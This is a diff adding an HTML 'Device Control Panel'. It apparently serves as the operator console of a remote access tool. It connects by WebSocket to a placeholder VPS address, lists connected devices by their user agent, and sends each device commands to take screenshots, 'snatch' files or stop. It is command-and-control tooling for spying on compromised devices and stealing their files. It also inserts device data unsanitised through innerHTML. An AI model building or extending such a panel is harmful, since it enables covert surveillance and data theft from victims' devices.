@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Control Panel</title>
+    <style>
+        body { font-family: Arial; background: #1a1a1a; color: #fff;}        .device { border: 1px solid #444; padding: 10px; margin: 10px;}        button { background: #ff4444; color: #fff; border: none; padding: 10px;}    </style>
+</head>
+<body>
+    <h1>Device Control Panel</h1>
+    <div id="devices"></div>
+    <script>
+        const ws = new WebSocket('wss://your-vps-ip:8080');
+        ws.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            const devicesDiv = document.getElementById('devices');
+            devicesDiv.innerHTML = data.devices.map(d =>`                <div class="device">
+                    <p>Device:${d.userAgent}</p>
+                    <button onclick="sendCommand('${d.id}', 'screenshot')">Screenshot</button>
+                    <button onclick="sendCommand('${d.id}', 'snatch')">Snatch Files</button>
+                    <button onclick="sendCommand('${d.id}', 'stop')">Stop</button>
+                </div>`).join('');};        function sendCommand(id, cmd) {
+            ws.send(JSON.stringify({ id, cmd }));}    </script>
+</body>
+</html>
